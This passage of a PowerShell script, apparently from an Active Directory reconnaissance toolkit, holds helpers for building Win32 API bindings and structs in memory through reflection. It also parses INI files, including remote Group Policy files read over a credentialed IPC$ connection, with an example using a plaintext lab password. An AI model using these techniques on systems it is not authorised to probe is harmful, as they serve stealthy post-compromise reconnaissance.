    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}



function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum {


    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
<#
.SYNOPSIS

Creates an in-memory struct for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field

.DESCRIPTION

The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.

One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.

.PARAMETER Module

The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the struct.

.PARAMETER StructFields

A hashtable of fields. Use the 'field' helper function to ease
defining each field.

.PARAMETER PackingSize

Specifies the memory alignment of fields.

.PARAMETER ExplicitLayout

Indicates that an explicit offset for each field will be specified.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}

$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}

# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}


########################################################
#
# Misc. helpers
#
########################################################

Function New-DynamicParameter {
<#
.SYNOPSIS

Helper function to simplify creating dynamic parameters.

    Adapated from https://beatcracker.wordpress.com/2015/08/10/dynamic-parameters-validateset-and-enums/.
    Originally released under the Microsoft Public License (Ms-PL).

.DESCRIPTION

Helper function to simplify creating dynamic parameters.

Example use cases:
    Include parameters only if your environment dictates it
    Include parameters depending on the value of a user-specified parameter
    Provide tab completion and intellisense for parameters, depending on the environment

Please keep in mind that all dynamic parameters you create, will not have corresponding variables created.
    Use New-DynamicParameter with 'CreateVariables' switch in your main code block,
    ('Process' for advanced functions) to create those variables.
    Alternatively, manually reference $PSBoundParameters for the dynamic parameter value.

This function has two operating modes:

1. All dynamic parameters created in one pass using pipeline input to the function. This mode allows to create dynamic parameters en masse,
with one function call. There is no need to create and maintain custom RuntimeDefinedParameterDictionary.

2. Dynamic parameters are created by separate function calls and added to the RuntimeDefinedParameterDictionary you created beforehand.
Then you output this RuntimeDefinedParameterDictionary to the pipeline. This allows more fine-grained control of the dynamic parameters,
with custom conditions and so on.

.NOTES

Credits to jrich523 and ramblingcookiemonster for their initial code and inspiration:
    https://github.com/RamblingCookieMonster/PowerShell/blob/master/New-DynamicParam.ps1
    http://ramblingcookiemonster.wordpress.com/2014/11/27/quick-hits-credentials-and-dynamic-parameters/
    http://jrich523.wordpress.com/2013/05/30/powershell-simple-way-to-add-dynamic-parameters-to-advanced-function/

Credit to BM for alias and type parameters and their handling

.PARAMETER Name

Name of the dynamic parameter

.PARAMETER Type

Type for the dynamic parameter.  Default is string

.PARAMETER Alias

If specified, one or more aliases to assign to the dynamic parameter

.PARAMETER Mandatory

If specified, set the Mandatory attribute for this dynamic parameter

.PARAMETER Position

If specified, set the Position attribute for this dynamic parameter

.PARAMETER HelpMessage

If specified, set the HelpMessage for this dynamic parameter

.PARAMETER DontShow

If specified, set the DontShow for this dynamic parameter.
This is the new PowerShell 4.0 attribute that hides parameter from tab-completion.
http://www.powershellmagazine.com/2013/07/29/pstip-hiding-parameters-from-tab-completion/

.PARAMETER ValueFromPipeline

If specified, set the ValueFromPipeline attribute for this dynamic parameter

.PARAMETER ValueFromPipelineByPropertyName

If specified, set the ValueFromPipelineByPropertyName attribute for this dynamic parameter

.PARAMETER ValueFromRemainingArguments

If specified, set the ValueFromRemainingArguments attribute for this dynamic parameter

.PARAMETER ParameterSetName

If specified, set the ParameterSet attribute for this dynamic parameter. By default parameter is added to all parameters sets.

.PARAMETER AllowNull

If specified, set the AllowNull attribute of this dynamic parameter

.PARAMETER AllowEmptyString

If specified, set the AllowEmptyString attribute of this dynamic parameter

.PARAMETER AllowEmptyCollection

If specified, set the AllowEmptyCollection attribute of this dynamic parameter

.PARAMETER ValidateNotNull

If specified, set the ValidateNotNull attribute of this dynamic parameter

.PARAMETER ValidateNotNullOrEmpty

If specified, set the ValidateNotNullOrEmpty attribute of this dynamic parameter

.PARAMETER ValidateRange

If specified, set the ValidateRange attribute of this dynamic parameter

.PARAMETER ValidateLength

If specified, set the ValidateLength attribute of this dynamic parameter

.PARAMETER ValidatePattern

If specified, set the ValidatePattern attribute of this dynamic parameter

.PARAMETER ValidateScript

If specified, set the ValidateScript attribute of this dynamic parameter

.PARAMETER ValidateSet

If specified, set the ValidateSet attribute of this dynamic parameter

.PARAMETER Dictionary

If specified, add resulting RuntimeDefinedParameter to an existing RuntimeDefinedParameterDictionary.
Appropriate for custom dynamic parameters creation.

If not specified, create and return a RuntimeDefinedParameterDictionary
Appropriate for a simple dynamic parameter creation.
#>

    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$Type = [int],

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$Alias,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$Mandatory,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$Position,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$HelpMessage,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$DontShow,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipeline,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipelineByPropertyName,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromRemainingArguments,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$ParameterSetName = '__AllParameterSets',

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowNull,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyString,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyCollection,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNull,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNullOrEmpty,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateCount,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateRange,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateLength,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$ValidatePattern,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$ValidateScript,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$ValidateSet,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            $true
        })]
        $Dictionary = $false,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$CreateVariables,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            # System.Management.Automation.PSBoundParametersDictionary is an internal sealed class,
            # so one can't use PowerShell's '-is' operator to validate type.
            if($_.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            $true
        })]
        $BoundParameters
    )

    Begin {
        $InternalDictionary = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $CommonParameters = (Get-Command _temp).Parameters.Keys
    }

    Process {
        if($CreateVariables) {
            $BoundKeys = $BoundParameters.Keys | Where-Object { $CommonParameters -notcontains $_ }
            ForEach($Parameter in $BoundKeys) {
                if ($Parameter) {
                    Set-Variable -Name $Parameter -Value $BoundParameters.$Parameter -Scope 1 -Force
                }
            }
        }
        else {
            $StaleKeys = @()
            $StaleKeys = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {
                                # If object has Equals, compare bound key and variable using it
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                # If object doesn't has Equals (e.g. $null), fallback to the PowerShell's -ne operator
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($StaleKeys) {
                $StaleKeys | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }

            # Since we rely solely on $PSBoundParameters, we don't have access to default values for unbound parameters
            $UnboundParameters = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        # Find parameters that are belong to the current parameter set
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                # Find unbound parameters in the current parameter set
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }

            # Even if parameter is not bound, corresponding variable is created with parameter's default value (if specified)
            $tmp = $null
            ForEach ($Parameter in $UnboundParameters) {
                $DefaultValue = Get-Variable -Name $Parameter -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($Parameter, [ref]$tmp) -and $DefaultValue) {
                    $PSBoundParameters.$Parameter = $DefaultValue
                }
            }

            if($Dictionary) {
                $DPDictionary = $Dictionary
            }
            else {
                $DPDictionary = $InternalDictionary
            }

            # Shortcut for getting local variables
            $GetVar = {Get-Variable -Name $_ -ValueOnly -Scope 0}

            # Strings to match attributes and validation arguments
            $AttributeRegex = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            $ValidationRegex = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            $AliasRegex = '^Alias$'
            $ParameterAttribute = New-Object -TypeName System.Management.Automation.ParameterAttribute

            switch -regex ($PSBoundParameters.Keys) {
                $AttributeRegex {
                    Try {
                        $ParameterAttribute.$_ = . $GetVar
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }

            if($DPDictionary.Keys -contains $Name) {
                $DPDictionary.$Name.Attributes.Add($ParameterAttribute)
            }
            else {
                $AttributeCollection = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $ValidationRegex {
                        Try {
                            $ParameterOptions = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterOptions)
                        }
                        Catch { $_ }
                        continue
                    }
                    $AliasRegex {
                        Try {
                            $ParameterAlias = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterAlias)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $AttributeCollection.Add($ParameterAttribute)
                $Parameter = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $AttributeCollection)
                $DPDictionary.Add($Name, $Parameter)
            }
        }
    }

    End {
        if(!$CreateVariables -and !$Dictionary) {
            $DPDictionary
        }
    }
}


function Get-IniContent {
<#
.SYNOPSIS

This helper parses an .ini file into a hashtable.

Author: 'The Scripting Guys'
Modifications: @harmj0y (-Credential support)
License: BSD 3-Clause
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection

.DESCRIPTION

Parses an .ini file into a hashtable. If -Credential is supplied,
then Add-RemoteConnection is used to map \\COMPUTERNAME\IPC$, the file
is parsed, and then the connection is destroyed with Remove-RemoteConnection.

.PARAMETER Path

Specifies the path to the .ini file to parse.

.PARAMETER OutputObject

Switch. Output a custom PSObject instead of a hashtable.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

Get-IniContent C:\Windows\example.ini

.EXAMPLE

"C:\Windows\example.ini" | Get-IniContent -OutputObject

Outputs the .ini details as a proper nested PSObject.

.EXAMPLE

"C:\Windows\example.ini" | Get-IniContent

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-IniContent -Path \\PRIMARY.testlab.local\C$\Temp\GptTmpl.inf -Credential $Cred

.INPUTS

String

Accepts one or more .ini paths on the pipeline.

.OUTPUTS

Hashtable

Ouputs a hashtable representing the parsed .ini file.

.LINK

https://blogs.technet.microsoft.com/heyscriptingguy/2011/08/20/use-powershell-to-work-with-any-ini-file/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $OutputObject
    )

    BEGIN {
        $MappedComputers = @{}
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $HostComputer = (New-Object System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    # map IPC$ to this computer if it's not already
                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }

            if (Test-Path -Path $TargetPath) {
                if ($PSBoundParameters['OutputObject']) {
                    $IniObject = New-Object PSObject
                }
                else {
                    $IniObject = @{}
                }
                Switch -Regex -File $TargetPath {
                    "^\[(.+)\]" # Section
                    {
                        $Section = $matches[1].Trim()
                        if ($PSBoundParameters['OutputObject']) {
                            $Section = $Section.Replace(' ', '')
                            $SectionObject = New-Object PSObject
                            $IniObject | Add-Member Noteproperty $Section $SectionObject
                        }
                        else {
                            $IniObject[$Section] = @{}
                        }
                        $CommentCount = 0
                    }
                    "^(;.*)$" # Comment
                    {
                        $Value = $matches[1].Trim()
                        $CommentCount = $CommentCount + 1
                        $Name = 'Comment' + $CommentCount
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $IniObject.$Section | Add-Member Noteproperty $Name $Value
                        }
                        else {
                            $IniObject[$Section][$Name] = $Value
                        }
                    }
                    "(.+?)\s*=(.*)" # Key
                    {
                        $Name, $Value = $matches[1..2]
                        $Name = $Name.Trim()
                        $Values = $Value.split(',') | ForEach-Object { $_.Trim() }

                        # if ($Values -isnot [System.Array]) { $Values = @($Values) }

                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $IniObject.$Section | Add-Member Noteproperty $Name $Values
                        }
                        else {
                            $IniObject[$Section][$Name] = $Values
                        }
                    }
                }
                $IniObject
            }
        }
    }

    END {
        # remove the IPC$ mappings
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}


function Export-CSV {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $InputObject,

        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $Delimiter = ',',

        [Switch]
        $Append
    )

    BEGIN {
        $OutputPath = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
        $Exists = [System.IO.File]::Exists($OutputPath)

        # mutex so threaded code doesn't stomp on the output file
        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'
        $Null = $Mutex.WaitOne()

        if ($PSBoundParameters['Append']) {
